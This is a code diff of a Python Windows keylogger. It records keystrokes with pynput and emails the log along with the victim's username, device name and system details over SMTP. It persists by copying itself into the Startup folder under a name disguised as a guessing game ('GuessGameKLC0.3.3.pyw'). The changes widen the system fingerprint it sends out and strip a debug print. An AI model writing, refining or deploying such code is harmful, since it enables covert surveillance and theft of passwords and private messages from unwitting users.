@@ -1,13 +1,4 @@
-import pynput
-import smtplib
-import os
-import re
-import win32api
-import datetime
-import platform
-import atexit
-import shutil
-import sys
+import pynput, smtplib, os, re, win32api, datetime, platform, atexit, shutil, sys
 from pynput.keyboard import Key, Listener
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -46,7 +37,7 @@ def sendMail():
 
     f = open(path, "r")
 
-    body = f"Os: {platform.system()}\nUserName: {os.getlogin()}\n\n{f.read()}"
+    body = f"Machine: {platform.machine()}\nOs: {platform.system()} {platform.version()}\nUserName: {os.getlogin()}\nDevice Name: {platform.node()}\nProcessor: {platform.processor}\n\n{f.read()}"
     msg.attach(MIMEText(body,'plain'))
     
     text = msg.as_string()
@@ -65,8 +56,6 @@ try:
     scriptPath = os.path.realpath(__file__)
 except NameError:
     scriptPath = os.path.realpath(sys.argv[0])
-
-print(scriptPath)
 
 shutil.copy(scriptPath, f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GuessGameKLC0.3.3.pyw")
 #This function will save the keys
